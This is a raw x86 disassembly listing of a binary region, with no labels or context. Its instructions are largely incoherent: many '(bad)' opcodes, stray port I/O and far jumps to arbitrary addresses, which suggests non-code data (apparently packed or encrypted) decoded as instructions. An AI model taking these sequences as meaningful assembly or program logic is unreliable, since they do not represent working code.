  41800e:	adc    dl,ch
  418010:	dec    ch
  418012:	imul   esi,DWORD PTR [edi],0x71
  418015:	xchg   ecx,eax
  418016:	sub    al,BYTE PTR [edx-0x47935ffe]
  41801c:	call   0x7c:0xc641ecf5
  418023:	fidivr DWORD PTR [edi-0x5ff196c9]
  418029:	repnz dec ebp
  41802b:	jbe    0x418038
  41802d:	ins    BYTE PTR es:[edi],dx
  41802e:	ror    bh,0x41
  418031:	int    0x60
  418033:	or     al,0xdb
  418035:	scas   eax,DWORD PTR es:[edi]
  418036:	sbb    DWORD PTR [eax+0x68496819],0xffffffb5
  41803d:	hlt    
  41803e:	push   esi
  41803f:	adc    BYTE PTR [ebp+0x48],0x1b
  418043:	and    ch,BYTE PTR [eax+0x2]
  418046:	hlt    
  418047:	pop    es
  418048:	push   ebp
  418049:	jae    0x417fd2
  41804b:	inc    ebp
  41804c:	and    cl,BYTE PTR [edx-0x11]
  41804f:	out    0x5e,al
  418051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418052:	scas   eax,DWORD PTR es:[edi]
  418053:	fiadd  WORD PTR [ebx+esi*1]
  418056:	cwde   
  418057:	test   eax,0xd00cfdf7
  41805c:	sbb    al,bl
  41805e:	add    eax,DWORD PTR [edx]
  418060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418061:	mov    esp,0x57c7498
  418066:	adc    al,0xce
  418068:	int    0xdb
  41806a:	test   eax,0x3096e506
  41806f:	adc    eax,0x8387ccd2
  418074:	lods   al,BYTE PTR ds:[esi]
  418075:	sbb    DWORD PTR [eax+0x2a0d5081],ebx
  41807b:	outs   dx,BYTE PTR es:[esi]
  41807d:	sub    edx,DWORD PTR [ebp-0x26e5fbc2]
  418083:	mov    dl,0x69
  418085:	add    al,0x7f
  418087:	add    eax,0xda862d75
  41808c:	adc    eax,0xd72ed034
  418091:	mov    al,0xa2
  418093:	pop    ebx
  418094:	in     eax,dx
  418095:	int    0xda
  418097:	loop   0x418077
  418099:	loopne 0x41801b
  41809b:	dec    esi
  41809c:	repz scas eax,DWORD PTR es:[edi]
  41809e:	dec    eax
  41809f:	jno    0x41810d
  4180a1:	xchg   esi,eax
  4180a2:	mov    edx,0x1488153
  4180a7:	sub    bl,BYTE PTR [edx+0x5d]
  4180aa:	push   0xffffff8c
  4180ac:	and    al,0xe2
  4180ae:	fisubr WORD PTR [edi]
  4180b0:	ror    BYTE PTR [ecx+edx*4],1
  4180b3:	mov    dl,0x99
  4180b5:	and    esp,DWORD PTR [ecx-0x41]
  4180b8:	push   edi
  4180b9:	or     BYTE PTR ds:0x22cf30f9,bh
  4180bf:	sahf   
  4180c0:	je     0x41812e
  4180c2:	in     al,0x39
  4180c4:	xchg   DWORD PTR [ebx-0x2991445b],ebx
  4180ca:	mov    DWORD PTR [ecx+ecx*8-0x45],eax
  4180ce:	jmp    0x4180f7
  4180d0:	dec    ecx
  4180d1:	adc    dh,BYTE PTR [edi-0x2657dda8]
  4180d7:	sbb    eax,0x88c0ca75
  4180dc:	or     BYTE PTR [ebp+0x6a691479],ch
  4180e2:	loopne 0x41810a
  4180e4:	sub    BYTE PTR [ebx+0x77],ch
  4180e7:	adc    DWORD PTR [eax-0x2f],ecx
  4180ea:	mov    bh,0xb1
  4180ec:	(bad)  
  4180ed:	sbb    bh,cl
  4180ef:	fldcw  WORD PTR [edi-0x41]
  4180f2:	xor    al,0xe7
  4180f4:	lea    edx,[ebx]
  4180f6:	or     BYTE PTR [ecx+edx*1+0x324bd702],dh
  4180fd:	stos   BYTE PTR es:[edi],al
  4180fe:	out    0x76,eax
  418100:	mov    al,0x67
  418102:	ss push 0x8ca01753
  418108:	xor    al,0xaf
  41810a:	push   cs
  41810b:	mov    DWORD PTR [edi-0x4b],eax
  41810e:	mov    bh,0xaa
  418110:	mov    al,ds:0x6c3752d0
  418115:	push   esi
  418116:	loop   0x4180ee
  418118:	rcl    BYTE PTR [ebp-0x70],1
  41811b:	or     esp,DWORD PTR [ecx-0x2d]
  41811e:	mov    dh,0xc6
  418120:	stos   BYTE PTR es:[edi],al
  418121:	out    0x45,al
  418123:	aad    0x92
  418125:	loopne 0x418150
  418127:	pop    eax
  418128:	jb     0x4180d3
  41812a:	aam    0x23
  41812c:	inc    ebp
  41812d:	xchg   esp,eax
  41812e:	cld    
  41812f:	test   BYTE PTR [ebp+0x3a],cl
  418132:	popf   
  418133:	mov    es,ebp
  418135:	dec    ebx
  418136:	fldenv [ebp+eax*2+0x49]
  41813a:	jmp    0x4180f0
  41813c:	pop    esp
  41813d:	stos   BYTE PTR es:[edi],al
  41813e:	es mov edx,0xe98a5b20
  418144:	add    al,0x3c
  418146:	loop   0x4181bf
  418148:	jnp    0x418154
  41814a:	xor    eax,0xdc2ebd1b
  41814f:	mov    edx,0xc38939c0
  418154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418155:	test   BYTE PTR [eax-0x16],bh
  418158:	call   DWORD PTR [ecx]
  41815a:	shl    BYTE PTR [eax+0x3e],0xe4
  41815e:	imul   edx,ecx,0x30
  418161:	mov    ecx,0xd30c5228
  418166:	mov    ecx,0x2a290269
  41816b:	push   ecx
  41816c:	mov    edx,0xa14224f7
  418171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418172:	jae    0x4181a1
  418174:	stc    
  418175:	or     ecx,ebp
  418177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418178:	xor    eax,0xefe5f89
  41817d:	lods   eax,DWORD PTR ds:[esi]
  41817e:	or     esp,edi
  418180:	mov    al,ds:0x31f0323b
  418185:	adc    ah,BYTE PTR [ebx+0x3446b79c]
  41818b:	icebp  
  41818c:	dec    ecx
  41818d:	dec    edx
  41818e:	xchg   edi,eax
  41818f:	in     al,0xa
  418191:	push   eax
  418192:	and    edx,DWORD PTR [edi]
  418194:	nop
  418195:	aas    
  418196:	cmp    BYTE PTR [edi-0x5f],bh
  418199:	dec    edi
  41819a:	adc    DWORD PTR [esp+0x4c],0xb3b2e980
  4181a2:	lock cmp bl,BYTE PTR [edx+0x6e040145]
  4181a9:	mov    cl,0xbf
  4181ab:	repz retf 
  4181ad:	sub    dl,bl
  4181af:	pop    ss
  4181b0:	sub    bh,dh
  4181b2:	mov    ebx,0xf1bb51d2
  4181b7:	repnz mov cl,0xbd
  4181ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181bb:	cmp    al,0xc7
  4181bd:	out    dx,eax
  4181be:	or     esi,DWORD PTR [ebp+edx*2+0x69]
  4181c2:	jp     0x4181b8
  4181c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181c5:	cmp    al,0xee
  4181c7:	sbb    al,cl
  4181c9:	sub    esi,DWORD PTR [eax+0x21e7f37d]
  4181cf:	xchg   esi,eax
  4181d0:	jle    0x4181bb
  4181d2:	ds (bad) 
  4181d4:	mov    al,0xe7
  4181d6:	mov    ah,0x23
  4181d8:	lea    edi,[eax]
  4181da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181db:	jnp    0xe463ac5e
  4181e1:	push   0xc7236c3
  4181e6:	or     bh,BYTE PTR [edx+0xf]
  4181e9:	out    dx,al
  4181ea:	sub    eax,0x7a549a78
  4181ef:	int3   
  4181f0:	rcl    edx,cl
  4181f2:	jp     0x4181d0
  4181f4:	or     bh,BYTE PTR [ebx]
  4181f6:	pop    esi
  4181f7:	push   cs
  4181f8:	rcr    bh,cl
  4181fa:	js     0x4181db
  4181fc:	pop    eax
  4181fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181fe:	stos   DWORD PTR es:[edi],eax
  4181ff:	mov    WORD PTR [edi+0x4fa40e49],ds
  418205:	pop    esp
  418206:	pop    eax
  418207:	cmp    edx,ecx
  418209:	add    eax,0x6fbf9293
  41820e:	ret    
  41820f:	mov    edi,0x3925d5f0
  418214:	jecxz  0x418283
  418216:	and    BYTE PTR [ecx+0x72],0xdd
  41821a:	sar    BYTE PTR [ecx],0x35
  41821d:	and    BYTE PTR [edi-0x3d1e0494],0xe
  418224:	inc    eax
  418225:	inc    edx
  418226:	dec    esp
  418227:	pop    ss
  418228:	loop   0x4181ba
  41822a:	xchg   ecx,eax
  41822b:	into   
  41822c:	aas    
  41822d:	push   0x87589f7
  418232:	jae    0x4181e7
  418234:	xchg   BYTE PTR [eax+0x587e37aa],bh
  41823a:	mov    ebx,0xc482f042
  41823f:	mov    ebp,0x71ee5e52
  418244:	in     al,dx
  418245:	push   es
  418246:	test   ah,al
  418248:	cmp    esi,edx
  41824a:	push   ebx
  41824b:	sbb    al,0x31
  41824d:	dec    ebx
  41824e:	imul   ebp,edx,0x193e1dd1
  418254:	daa    
  418255:	sbb    al,0x52
  418257:	out    dx,eax
  418258:	div    BYTE PTR [ebx+esi*2]
  41825b:	mov    al,ds:0x4f9c7de2
  418260:	(bad)  
  418262:	(bad)  
  418263:	sahf   
  418264:	jl     0x4182cb
  418266:	enter  0xe48f,0x8
  41826a:	out    0xc2,eax
  41826c:	iret   
  41826d:	cmp    esp,DWORD PTR [eax-0x5e]
  418270:	sbb    eax,0x5fd38d0e
  418275:	push   esi
  418276:	xor    edx,ecx
  418278:	ror    BYTE PTR [ebx+0x3e],1
  41827b:	pop    edx
  41827c:	je     0x41820f
  41827e:	push   es
  41827f:	arpl   WORD PTR [ebx-0x2],bp
  418282:	js     0x418297
  418284:	xchg   edi,eax
  418285:	cmp    DWORD PTR [ebx-0x44063418],edx
  41828b:	sti    
  41828c:	or     DWORD PTR [edi-0x693542e4],esi
  418292:	sub    al,0xa7
  418294:	retf   0xccca
  418297:	xor    DWORD PTR [edi+0x5d11d2c5],esp
  41829d:	repnz sahf 
  41829f:	pushf  
  4182a0:	push   ecx
  4182a1:	jmp    0x3de3fd23
  4182a6:	pop    edi
  4182a7:	add    al,0xe5
  4182a9:	push   0x52
  4182ab:	xor    dh,dl
  4182ad:	dec    edi
  4182ae:	in     eax,0xa6
  4182b0:	add    dh,cl
  4182b2:	mov    BYTE PTR [ebx+0x196b768f],0x8f
  4182b9:	inc    edi
  4182ba:	es pop ss
  4182bc:	mov    dl,0x90
  4182be:	ficomp WORD PTR [esi]
  4182c0:	cdq    
  4182c1:	lods   eax,DWORD PTR ds:[esi]
  4182c2:	inc    edi
  4182c3:	int3   
  4182c4:	fwait
  4182c5:	push   0x4946012c
  4182ca:	in     eax,0x96
  4182cc:	mov    cl,0x1e
  4182ce:	mov    ds:0x63242026,eax
  4182d3:	add    al,0x2e
  4182d5:	push   0xffffff95
  4182d7:	fisttp QWORD PTR [edx-0x82b7dd7]
  4182dd:	stos   BYTE PTR es:[edi],al
  4182de:	inc    ebp
  4182df:	ss stos BYTE PTR es:[edi],al
  4182e1:	popa   
  4182e2:	aas    
  4182e3:	iret   
  4182e4:	pop    ebp
  4182e5:	sub    bl,BYTE PTR [ebx]
  4182e7:	xchg   BYTE PTR [eax],dh
  4182e9:	jge    0x4182de
  4182eb:	cli    
  4182ec:	(bad)  
  4182ee:	dec    edx
  4182ef:	jl     0x41828f
  4182f1:	in     al,0xfd
  4182f3:	push   ebp
  4182f4:	jmp    0x6b29a238
  4182f9:	fldenv [edx]
  4182fb:	mov    bh,0x6b
  4182fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182fe:	and    BYTE PTR [edx],ch
  418300:	dec    esi
  418301:	enter  0x9f36,0x7b
  418305:	inc    ebp
  418306:	out    0x7,eax
  418308:	out    dx,eax
  418309:	sbb    al,0x16
  41830b:	je     0x4182dd
  41830d:	fild   DWORD PTR [edi-0x4c523aa5]
  418313:	add    esi,DWORD PTR [edi+0x2bbfad4c]
  418319:	in     al,0x5e
  41831b:	and    DWORD PTR [ebp-0x20],eax
  41831e:	xchg   ebx,eax
  41831f:	jnp    0x418369
  418321:	fcomp  QWORD PTR [esi+eax*8+0xf]
  418325:	hlt    
  418326:	pop    edx
  418327:	dec    ecx
  418328:	popa   
  418329:	dec    ebx
  41832a:	scas   eax,DWORD PTR es:[edi]
  41832b:	xor    DWORD PTR [esi+eax*8-0x32c5dd61],ebp
  418332:	in     al,0x15
  418334:	mov    ds:0x7835b127,eax
  418339:	cdq    
  41833a:	mov    ebx,0xca04dc88
  41833f:	daa    
  418340:	retf   0x3f1d
  418343:	mov    al,ds:0x6f1da2d3
  418348:	pusha  
  418349:	fstp   TBYTE PTR ds:0xb75bd079
  41834f:	lea    esi,[edx]
  418351:	push   ebp
  418352:	test   DWORD PTR [eax-0x4c5da0c4],esp
  418358:	jb     0x4182ea
  41835a:	jmp    0x63bf:0xec0241ff
  418361:	and    ah,BYTE PTR [ecx+0x60]
  418364:	jmp    0x418326
  418366:	adc    DWORD PTR [edx-0x40],edx
  418369:	ins    DWORD PTR es:[edi],dx
  41836a:	pop    edi
  41836b:	gs and cl,ah
  41836e:	call   0x1672:0x646db2a0
  418375:	in     eax,0x4a
  418377:	loop   0x41835e
  418379:	ins    BYTE PTR es:[edi],dx
  41837a:	add    bh,bh
  41837c:	add    ecx,DWORD PTR ds:[edx+0x8]
  418380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418381:	or     DWORD PTR cs:[eax],esi
  418384:	and    al,0x9b
  418386:	add    DWORD PTR [ebx-0x3de43f48],edx
  41838c:	or     al,0x9
  41838e:	mov    cl,0xb4
  418390:	outs   dx,DWORD PTR ds:[esi]
  418391:	clc    
  418392:	mov    eax,ds:0x490361d6
  418397:	sub    eax,0x35b78ce4
  41839c:	add    edx,DWORD PTR [edx+0x3572ade]
  4183a2:	lsl    esp,WORD PTR [edx-0x59]
  4183a6:	mov    bl,0x24
  4183a8:	jne    0x418416
  4183aa:	xor    ecx,DWORD PTR [esi-0x646d39e7]
  4183b0:	shl    DWORD PTR [di],cl
  4183b3:	cmp    eax,0xb0a61438
  4183b8:	sbb    eax,0xe43932d0
  4183bd:	xchg   ecx,eax
  4183be:	xor    eax,DWORD PTR [edi]
  4183c0:	adc    BYTE PTR [edi+0x25],ah
  4183c3:	mov    eax,0xdfb9bd26
  4183c8:	pusha  
  4183c9:	and    DWORD PTR [edi+0x432d37d5],ecx
  4183cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183d0:	outs   dx,DWORD PTR ds:[esi]
  4183d1:	cmc    
  4183d2:	or     al,dh
  4183d4:	nop
  4183d5:	nop
  4183d6:	mov    ch,0x6e
  4183d8:	cld    
  4183d9:	inc    eax
  4183da:	add    esi,ecx
  4183dc:	push   ecx
  4183dd:	mov    esp,0x7c0b9d95
  4183e2:	out    dx,al
  4183e3:	sbb    DWORD PTR [edx+0x73],edx
  4183e6:	shl    DWORD PTR [edx-0x3c],cl
  4183e9:	or     DWORD PTR [edx+0xb],esi
  4183ec:	outs   dx,BYTE PTR ds:[esi]
  4183ed:	dec    ebp
  4183ee:	or     DWORD PTR [edx-0x26],edi
  4183f1:	and    BYTE PTR [edx+0x1f74b12d],cl
  4183f7:	shr    ah,1
  4183f9:	mov    ds:0xbcee68d5,eax
  4183fe:	test   DWORD PTR [edi-0x1c],0x12cfbd57
  418405:	cmp    BYTE PTR [ebx],0xb
  418408:	mov    DWORD PTR [ebp-0x5b],edi
  41840b:	fldcw  WORD PTR [eax-0x26]
  41840e:	(bad)  
  41840f:	mov    bh,0xcd
  418411:	or     DWORD PTR [edi+0x3c],ebx
  418414:	iret   
  418415:	inc    eax
  418416:	adc    BYTE PTR [ecx+0x2],bh
  418419:	shl    DWORD PTR [ebp+0x32],0xbe
  41841d:	dec    esp
  41841e:	hlt    
  41841f:	sub    ecx,DWORD PTR [esi+0x386c0afb]
  418425:	xor    BYTE PTR [ebx+edi*8],cl
  418428:	int3   
  418429:	inc    eax
  41842a:	mov    ebx,esi
  41842c:	push   esi
  41842d:	adc    BYTE PTR [eax],0x1e
  418430:	ds inc eax
  418432:	dec    ebp
  418433:	and    eax,0xe8c5843b
  418438:	daa    
  418439:	dec    edi
  41843a:	mov    ds:0x63a47e0f,eax
  41843f:	enter  0x7b10,0x5f
  418443:	out    dx,eax
  418444:	cmp    al,0xd9
  418446:	scas   al,BYTE PTR es:[edi]
  418447:	fdivr  DWORD PTR ds:0x3c20854a
  41844d:	(bad)  
  41844e:	mov    eax,ds:0xe9b69e0c
  418453:	pop    edx
  418454:	icebp  
  418455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418456:	or     eax,0x13136dbd
  41845b:	cld    
  41845c:	cmp    al,0x30
  41845e:	push   eax
  41845f:	fsubrp st(3),st
  418461:	adc    BYTE PTR es:[ebx],dl
  418464:	fimul  WORD PTR [ebp+0x1dda8252]
  41846a:	sub    al,0xc3
  41846c:	pop    dx
  41846e:	xchg   ebp,eax
  41846f:	test   BYTE PTR [ebx],0xfb
  418472:	mov    bh,0xd9
  418474:	push   es
  418475:	xchg   edx,esp
  418477:	dec    eax
  418478:	jle    0x4184f7
  41847a:	mov    ds:0x19b147b0,eax
  41847f:	sbb    BYTE PTR [ecx+0x434b8c0b],0x39
  418486:	ror    BYTE PTR [ebx+0x66],1
  418489:	push   0x5a
  41848b:	fdivr  QWORD PTR [ebp+0x77]
  41848e:	or     DWORD PTR [esi+0x5f],eax
  418491:	adc    al,0x81
  418493:	adc    dh,BYTE PTR ds:[ecx]
  418496:	cdq    
  418497:	popa   
  418498:	xor    DWORD PTR ds:0x7125232e,edx
  41849e:	outs   dx,DWORD PTR ds:[esi]
  41849f:	fst    QWORD PTR [ebp+0x3b]
  4184a2:	fiadd  WORD PTR [esi+ebx*4+0x35518e12]
  4184a9:	and    eax,0xc7e00816
  4184ae:	xchg   DWORD PTR [esi],edx
  4184b0:	shl    DWORD PTR [ebp+0x4f],cl
  4184b3:	jb     0x418456
  4184b5:	ret    
  4184b6:	xor    eax,0xa84e045b
  4184bb:	mov    BYTE PTR [edi+0x36bfb697],dh
  4184c1:	dec    edx
  4184c2:	sub    eax,0x456ba2b7
  4184c7:	push   ebx
  4184c8:	fistp  DWORD PTR [edx]
  4184ca:	dec    esp
  4184cb:	dec    edi
  4184cc:	xchg   esp,eax
  4184cd:	dec    edx
  4184ce:	popa   
  4184cf:	inc    eax
  4184d0:	pop    ebp
  4184d1:	mov    dh,0xd0
  4184d3:	enter  0xf032,0x7d
  4184d7:	xchg   esp,eax
  4184d8:	out    dx,eax
  4184d9:	sbb    al,0xa
  4184db:	fmul   QWORD PTR [ecx+0x6e94cb1d]
  4184e1:	fiadd  WORD PTR [ecx-0x59e94c8e]
  4184e7:	gs jg  0x41848a
  4184ea:	xor    esp,esi
  4184ec:	or     edi,DWORD PTR [ebx+ebp*1+0x11]
  4184f0:	or     eax,0x2aec0876
  4184f5:	pop    esp
  4184f6:	stc    
  4184f7:	pop    edi
  4184f9:	jne    0x418485
  4184fb:	mov    eax,0x4180fce5
  418500:	mov    ebp,0xdca08f20
  418505:	cli    
  418506:	and    eax,0xdeafa6ae
  41850b:	cmc    
  41850c:	aam    0x97
  41850e:	cmp    eax,esi
  418510:	imul   ecx,ecx,0x38f80a81
  418516:	jmp    0x595f21de
  41851b:	or     dl,BYTE PTR [edx+0x28]
  41851e:	das    
  41851f:	and    bl,BYTE PTR [ecx+edx*4+0xa]
  418523:	and    eax,0x6a34e524
  418528:	push   0xffffffeb
  41852a:	mov    ch,0x80
  41852c:	jl     0x41857c
  41852e:	ja     0x4184c6
  418530:	(bad)  
  418531:	stc    
  418532:	jb     0x41856b
  418534:	pushf  
  418535:	push   esi
  418536:	aam    0xff
  418538:	mov    ah,0xf0
  41853a:	(bad)  
  41853b:	adc    cl,ch
  41853d:	pop    edi
  41853e:	pop    es
  41853f:	mov    WORD PTR [ecx-0x163b9b48],gs
  418545:	mov    dl,0x36
  418547:	and    al,0xe7
  418549:	and    ax,0xef66
  41854d:	cmp    DWORD PTR [edx],edi
  41854f:	mov    esp,0x2c925e19
  418554:	(bad)  
  418555:	gs or  esi,esi
  418558:	into   
  418559:	call   0xe1dc0f70
  41855e:	inc    ebp
  41855f:	aaa    
  418560:	cld    
  418561:	jne    0x4185c0
  418563:	addr16 inc edx
  418565:	and    edi,ecx
  418567:	dec    esp
  418568:	imul   ebx,esi,0x51
  41856b:	cmp    ebx,DWORD PTR [edx+0x6a]
  41856e:	sub    eax,0x5eab8b40
  418573:	sub    esi,DWORD PTR [esi+0x19]
  418576:	mov    ch,0x71
  418578:	push   0x7d
  41857a:	add    al,0x3e
  41857c:	pop    esp
  41857d:	push   es
  41857e:	sbb    ah,BYTE PTR [ecx+0x50ef6f79]
  418584:	inc    edi
  418585:	mov    bl,0x8f
  418587:	ins    BYTE PTR es:[edi],dx
  418588:	mov    ecx,DWORD PTR [eax]
  41858a:	mov    ds:0x181ed384,eax
  41858f:	icebp  
  418590:	mov    ebp,0x788a3670
  418595:	in     al,dx
  418596:	cld    
  418597:	das    
  418598:	inc    ecx
  418599:	lods   eax,DWORD PTR ds:[esi]
  41859a:	icebp  
  41859b:	cli    
  41859c:	push   esi
  41859d:	mov    edi,0xd9e35d04
  4185a2:	(bad)  
  4185a3:	cwde   
  4185a4:	loop   0x4185bc
  4185a6:	arpl   si,di
  4185a8:	xchg   edx,eax
  4185a9:	add    ecx,DWORD PTR [edx-0x7bdfd60d]
  4185af:	or     BYTE PTR [esi],dh
  4185b1:	mov    esp,ecx
  4185b3:	shr    BYTE PTR [ecx+0x13],cl
  4185b6:	repz or DWORD PTR [ebp+0x3f3e6444],0xe0e55ded
  4185c1:	jmp    0x6c9a:0x873eaa81
  4185c8:	push   0xaeb2cecf
  4185cd:	lds    esi,FWORD PTR [ecx-0x37]
  4185d0:	std    
  4185d1:	and    eax,0xa4b83667
  4185d6:	test   eax,0xc34d5ea5
  4185db:	pushf  
  4185dc:	push   cs
  4185dd:	mov    bl,0x44
  4185df:	imul   ebp,DWORD PTR [esi-0x3acfac50],0xfffffffc
  4185e6:	nop
  4185e7:	fisub  DWORD PTR [esi-0x34dfa4db]
  4185ed:	cmp    bl,bh
  4185ef:	ficomp WORD PTR [edi+0xcc847e8]
  4185f5:	in     eax,0x72
  4185f7:	imul   ebx,DWORD PTR [ebp+0x2e2da2b4],0xfffffff6
  4185fe:	pusha  
  4185ff:	xor    cl,BYTE PTR ds:0xde807f5b
  418605:	stos   BYTE PTR es:[edi],al
  418606:	stos   BYTE PTR es:[edi],al
  418607:	or     eax,0x7b0faf47
  41860c:	pop    ecx
  41860d:	cmp    ecx,DWORD PTR [esi]
  41860f:	xchg   BYTE PTR [ebx],ah
  418611:	fsub   DWORD PTR [eax-0x57]
  418614:	rcl    edi,0x2f
  418617:	aam    0x7a
  418619:	mov    ch,0x76
  41861b:	xchg   ecx,eax
  41861c:	adc    DWORD PTR [ebp+0x37],esi
  41861f:	or     BYTE PTR [edx],al
  418621:	repz jno 0x41863b
  418624:	mov    edx,0xeee61972
  418629:	mov    dl,0xa6
  41862b:	mov    ebp,0xb2f92bd8
  418630:	adc    BYTE PTR [edi-0x38],dl
  418633:	adc    BYTE PTR [edx+0x5e51275f],dl
  418639:	out    dx,eax
  41863a:	sub    ah,0x2b
  41863d:	push   edx
  41863e:	lods   al,BYTE PTR ds:[esi]
  41863f:	jae    0xf2553d9b
  418645:	popf   
  418646:	mul    BYTE PTR [ebp+0x7e1715ef]
  41864c:	adc    DWORD PTR cs:[ebx],esi
  41864f:	pop    ss
  418650:	mov    ebp,0xfc7970b6
  418655:	jns    0x418627
  418657:	xor    al,0xc
  418659:	xor    eax,0x97ccf69b
  41865e:	std    
  41865f:	ret    
  418660:	mov    ah,0x26
  418662:	jne    0x418659
  418664:	(bad)  
  418665:	mov    edi,0xa7e8ba18
  41866a:	mov    BYTE PTR [edi-0x293e98d1],bh
  418670:	or     DWORD PTR [ebx],0x89b8f13a
  418676:	mov    al,ds:0x9a632514
  41867b:	xor    eax,0x3ce5d991
  418680:	(bad)  
  418681:	enter  0x7697,0x9d
  418685:	dec    eax
  418686:	iret   
  418687:	mov    BYTE PTR [ebx],ah
  418689:	sbb    bl,BYTE PTR [ecx]
  41868b:	loopne 0x418654
  41868d:	aad    0xa1
  41868f:	loop   0x418694
  418691:	call   0xd9da:0xa766cf55
  418698:	test   BYTE PTR [edi-0x3],dh
  41869b:	rcr    DWORD PTR [edi+0x662cf075],cl
  4186a1:	add    ecx,DWORD PTR es:[edx]
  4186a4:	cld    
  4186a5:	std    
  4186a6:	xor    al,0x6b
  4186a8:	fwait
  4186a9:	sbb    al,0xa9
  4186ab:	out    dx,al
  4186ac:	inc    esi
  4186ad:	cmp    ah,BYTE PTR [esp+eiz*4]
  4186b0:	outs   dx,DWORD PTR ds:[esi]
  4186b1:	sub    eax,ecx
  4186b3:	pop    esp
  4186b4:	adc    esp,edx
  4186b6:	enter  0xf509,0xc8
  4186ba:	sar    DWORD PTR [ebp+0x41],cl
  4186bd:	out    0xe1,eax
  4186bf:	ret    
  4186c0:	je     0x418722
  4186c2:	nop
  4186c3:	int3   
  4186c4:	mov    dh,0xab
  4186c6:	icebp  
  4186c7:	ss (bad) 
  4186c9:	sbb    al,0x33
  4186cb:	push   edi
  4186cc:	inc    esi
  4186cd:	out    dx,eax
  4186ce:	iret   
  4186cf:	pop    es
  4186d0:	mov    eax,0x4ba43bb7
  4186d5:	jne    0x418733
  4186d7:	imul   sp,bx,0x62
  4186db:	das    
  4186dc:	inc    esp
  4186dd:	in     eax,0x36
  4186df:	mov    bl,0xa9
  4186e1:	dec    edx
  4186e2:	and    al,0xa2
  4186e4:	adc    esp,0x60
  4186e7:	mov    edi,0xed879774
  4186ec:	or     esi,DWORD PTR [edi-0x1]
  4186ef:	in     eax,0xcd
  4186f1:	adc    DWORD PTR [edi+0x54dde91e],edi
  4186f7:	leave  
  4186f8:	add    BYTE PTR [esi+ecx*1+0x6f],dh
  4186fc:	leave  
  4186fd:	jae    0x4186cf
  4186ff:	xchg   ebp,eax
  418700:	imul   edi,DWORD PTR [ecx+eiz*4+0x683f1901],0x17
  418708:	inc    eax
  418709:	fstp   DWORD PTR [edx-0x23c7bc96]
  41870f:	ss pop esp
  418711:	inc    edi
  418712:	push   ds
  418713:	jg     0x41872b
  418715:	or     eax,0x2150fd87
  41871a:	xchg   edx,eax
  41871b:	into   
  41871c:	xor    ecx,DWORD PTR [esi-0x51]
  41871f:	ss ins BYTE PTR es:[edi],dx
  418721:	adc    BYTE PTR [edi-0x20],cl
  418724:	add    edi,DWORD PTR [edx]
  418726:	xchg   esi,eax
  418727:	mov    edi,0xbffec6b4
  41872c:	jmp    0x418713
  41872e:	rcl    DWORD PTR [ebx+0x2757e2c6],cl
  418734:	mov    dh,0x7a
  418736:	out    dx,eax
  418737:	jbe    0x418767
  418739:	xchg   esi,eax
  41873a:	dec    ebx
  41873b:	xor    cl,BYTE PTR [ebx+0x2109564a]
  418741:	aad    0xf6
  418743:	in     eax,0x56
  418745:	and    ebx,DWORD PTR [edi+edi*8-0x4e]
  418749:	loopne 0x4186d6
  41874b:	inc    edi
  41874c:	lds    eax,FWORD PTR [edi+0x6b]
  41874f:	and    ah,cl
  418751:	aad    0x3d
  418753:	adc    BYTE PTR [ecx-0x68c080d2],ah
  418759:	(bad)  
  41875a:	pusha  
  41875b:	sub    dh,ch
  41875d:	and    eax,0xd542be11
  418762:	imul   eax
  418764:	fnsave [eax-0x71]
  418767:	test   DWORD PTR [edx],ecx
  418769:	dec    ebx
  41876a:	xor    DWORD PTR fs:[esi-0x78],ebx
  41876e:	into   
  41876f:	add    eax,0x2933a53
  418774:	add    BYTE PTR [esi-0x15],al
  418777:	push   esi
  418778:	mov    esp,0x1c7ca456
  41877d:	clc    
  41877e:	mov    ah,0x6b
  418780:	call   0x9e03:0x28722e2d
  418787:	retf   
  418788:	dec    edx
  418789:	rcr    DWORD PTR [edx],cl
  41878b:	jae    0x41874a
  41878d:	fs out 0x87,eax
  418790:	shl    BYTE PTR [edi-0x60],1
  418793:	mov    al,ds:0xc69a8704
  418798:	lock pop esp
  41879a:	or     DWORD PTR [esi-0x40],ebp
  41879d:	sub    DWORD PTR ds:0x40064b7d,ebp
  4187a3:	sub    DWORD PTR [ebx],ecx
  4187a5:	xlat   BYTE PTR ds:[ebx]
  4187a6:	mov    ecx,0xb76ce304
  4187ab:	mov    ah,0xbc
  4187ad:	add    dl,BYTE PTR [eax]
  4187af:	hlt    
  4187b0:	shl    DWORD PTR ds:0xa3316fc2,0x75
  4187b7:	or     BYTE PTR [edx-0x33],dh
  4187ba:	cli    
  4187bb:	pop    ecx
  4187bc:	mov    ds,WORD PTR [ebx+0x5f]
  4187bf:	cld    
  4187c0:	dec    esi
  4187c1:	cmp    eax,DWORD PTR [edx-0x616c4f35]
  4187c7:	rcr    DWORD PTR [ecx+0x62acfd79],0x16
  4187ce:	bswap  ebp
  4187d0:	inc    ebp
  4187d1:	inc    ebx
  4187d2:	mov    WORD PTR [ebp+0x2c298236],es
  4187d8:	cwde   
  4187d9:	icebp  
  4187da:	pushf  
  4187db:	add    DWORD PTR [edx-0x1d0ceb25],edi
  4187e1:	and    bh,BYTE PTR [esi+edi*4-0x5d]
  4187e5:	out    dx,eax
  4187e6:	test   edx,ecx
  4187e8:	dec    ecx
  4187e9:	inc    esi
  4187ea:	lds    edi,FWORD PTR [ebp-0x60655a12]
  4187f0:	jmp    0x418810
  4187f2:	sub    eax,0xa680c859
  4187f7:	loopne 0x4187a9
  4187f9:	jns    0x418814
  4187fb:	scas   eax,DWORD PTR es:[edi]
  4187fc:	fldz   
  4187fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187ff:	jmp    0x35d4addd
  418804:	add    al,0x92
  418806:	inc    esp
  418807:	push   0x1e
  418809:	(bad)  
